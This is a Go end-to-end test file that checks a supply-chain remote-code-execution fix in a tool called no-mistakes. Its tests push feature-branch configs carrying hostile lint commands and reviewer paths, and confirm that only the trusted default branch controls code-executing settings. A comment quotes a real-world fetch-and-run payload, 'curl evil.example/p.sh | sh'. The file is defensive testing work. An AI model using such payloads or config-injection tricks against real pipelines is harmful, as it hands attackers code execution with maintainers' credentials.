//go:build e2e

package e2e

import (
	"fmt"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/kunchenguid/no-mistakes/internal/types"
)

// TestRepoConfigCommandsFromDefaultBranch proves the supply-chain RCE fix
// (audit finding #1): the code-executing fields commands.* are loaded from the
// trusted default-branch copy of .no-mistakes.yaml, never from a contributor's
// pushed SHA. A feature branch ships a malicious lint command that writes a
// marker file; under the secure default the marker must never appear, while an
// explicit allow_repo_commands opt-in must run it — so the assertion is known
// to be meaningful rather than testing a no-op.
func TestRepoConfigCommandsFromDefaultBranch(t *testing.T) {
	t.Run("blocked_by_default", func(t *testing.T) {
		optOut := false
		h := NewHarness(t, SetupOpts{Agent: "claude", Scenario: cleanReviewScenario(t), AllowRepoCommands: &optOut})

		if out, err := h.Run("init"); err != nil {
			t.Fatalf("nm init: %v\n%s", err, out)
		}

		markerPath := pushMaliciousRepoConfig(t, h, "rce-blocked")

		run := h.WaitForRun("rce-blocked", 90*time.Second)
		if run.Status != types.RunCompleted {
			t.Fatalf("run did not complete: status=%s error=%v", run.Status, deref(run.Error))
		}

		if _, err := os.Stat(markerPath); err == nil {
			t.Fatalf("SECURITY REGRESSION: pushed-branch lint command executed (marker %s exists); commands.* must be loaded from the trusted default branch, not the pushed SHA", markerPath)
		}

		// Sanity: the lint step ran (it delegated to the agent because the
		// trusted default branch has no lint command) and reached a terminal
		// status, so the absence of the marker is a real result rather than a
		// pipeline that never got to lint.
		lintStep, ok := findStep(run.Steps, types.StepLint)
		if !ok {
			t.Fatalf("lint step missing from run results")
		}
		switch lintStep.Status {
		case types.StepStatusCompleted, types.StepStatusSkipped, types.StepStatusFailed:
		default:
			t.Fatalf("lint step did not reach a terminal status: %s", lintStep.Status)
		}
	})

	t.Run("executes_when_opted_in", func(t *testing.T) {
		// Same attack payload, but the maintainer has explicitly opted in via
		// allow_repo_commands. The pushed-branch command MUST run, proving the
		// marker check above is a meaningful guard against regressions.
		optIn := true
		h := NewHarness(t, SetupOpts{Agent: "claude", Scenario: cleanReviewScenario(t), AllowRepoCommands: &optIn})

		if out, err := h.Run("init"); err != nil {
			t.Fatalf("nm init: %v\n%s", err, out)
		}

		markerPath := pushMaliciousRepoConfig(t, h, "rce-optin")

		run := h.WaitForRun("rce-optin", 90*time.Second)
		// The opt-in run may complete or fail depending on later steps; either
		// way the lint payload must have executed. Guard with a clear message.
		if _, err := os.Stat(markerPath); err != nil {
			t.Fatalf("opt-in run should have executed the pushed-branch lint command (marker %s missing); run status=%s err=%v", markerPath, run.Status, deref(run.Error))
		}
	})

	t.Run("pushed_branch_review_blocked", func(t *testing.T) {
		// The review panel selects which reviewer binaries launch with
		// maintainer creds, so it is code-executing config locked to the
		// trusted default-branch copy. A pushed branch that ships a review
		// block must not override the trusted (empty) one. To detect a
		// leak we push a rovodev reviewer pointing at a nonexistent
		// binary: if the pushed config leaks through, ResolveReviewers
		// calls exec.LookPath on the bogus path and the run fails; under
		// the correct behavior the trusted empty review yields no
		// reviewers and the run completes.
		optOut := false
		h := NewHarness(t, SetupOpts{Agent: "claude", Scenario: cleanReviewScenario(t), AllowRepoCommands: &optOut})

		if out, err := h.Run("init"); err != nil {
			t.Fatalf("nm init: %v\n%s", err, out)
		}

		branch := "review-blocked"
		h.CommitChange(branch, branch+".txt", "change to gate\n", "add "+branch+" change")
		maliciousReview := "ignore_patterns:\n  - 'vendor/**'\nreview:\n  reviewers:\n    - agent: rovodev\n      path: /nonexistent/evil-rovodev\n"
		h.CommitChange(branch, ".no-mistakes.yaml", maliciousReview, "pushed-branch review panel")
		h.PushToGate(branch)

		run := h.WaitForRun(branch, 90*time.Second)
		if run.Status != types.RunCompleted {
			t.Fatalf("SECURITY REGRESSION: pushed-branch review config leaked through the trust boundary (run failed, likely exec.LookPath on the bogus reviewer path); status=%s error=%v", run.Status, deref(run.Error))
		}
	})

	t.Run("pushed_branch_cannot_self_enable", func(t *testing.T) {
		// Hard requirement of the per-repo move: allow_repo_commands is read
		// ONLY from the trusted default-branch copy, never the pushed SHA. A
		// contributor who sets allow_repo_commands: true on their feature
		// branch alongside a hostile command MUST NOT self-enable — the
		// trusted default branch says false, so the command is dropped.
		optOut := false
		h := NewHarness(t, SetupOpts{Agent: "claude", Scenario: cleanReviewScenario(t), AllowRepoCommands: &optOut})

		if out, err := h.Run("init"); err != nil {
			t.Fatalf("nm init: %v\n%s", err, out)
		}

		markerPath := filepath.Join(t.TempDir(), "pwned")
		branch := "rce-self-enable"
		h.CommitChange(branch, branch+".txt", "change to gate\n", "add "+branch+" change")
		// The contributor tries to flip the opt-in on AND ship a hostile
		// command in the same pushed copy. Both must be ignored: the trusted
		// default-branch copy controls the switch.
		selfEnableConfig := fmt.Sprintf("ignore_patterns:\n  - 'vendor/**'\nallow_repo_commands: true\ncommands:\n  lint: \"echo pwned > %s\"\n", markerPath)
		h.CommitChange(branch, ".no-mistakes.yaml", selfEnableConfig, "self-enable + malicious lint")
		h.PushToGate(branch)

		run := h.WaitForRun(branch, 90*time.Second)
		if run.Status != types.RunCompleted {
			t.Fatalf("run did not complete: status=%s error=%v", run.Status, deref(run.Error))
		}

		if _, err := os.Stat(markerPath); err == nil {
			t.Fatalf("SECURITY REGRESSION: pushed-branch allow_repo_commands self-enabled and ran the lint command (marker %s exists); the opt-in must be read from the trusted default branch, not the pushed SHA", markerPath)
		}
	})
}

// pushMaliciousRepoConfig creates a feature branch carrying a hostile
// .no-mistakes.yaml whose lint command writes a marker file, pushes it through
// the gate, and returns the marker path the test should assert on. The
// default-branch .no-mistakes.yaml (written by the harness) carries no
// commands, so it is the trusted source and yields empty commands under the
// secure default.
func pushMaliciousRepoConfig(t *testing.T, h *Harness, branch string) string {
	t.Helper()
	markerPath := filepath.Join(t.TempDir(), "pwned")

	// A real change so rebase has a non-empty diff.
	h.CommitChange(branch, branch+".txt", "change to gate\n", "add "+branch+" change")

	// The malicious payload: in the wild this would be
	// "curl evil.example/p.sh | sh". Here it writes a marker the test can see.
	maliciousConfig := fmt.Sprintf("ignore_patterns:\n  - 'vendor/**'\ncommands:\n  lint: \"echo pwned > %s\"\n", markerPath)
	h.CommitChange(branch, ".no-mistakes.yaml", maliciousConfig, "configure malicious lint command")

	h.PushToGate(branch)
	return markerPath
}
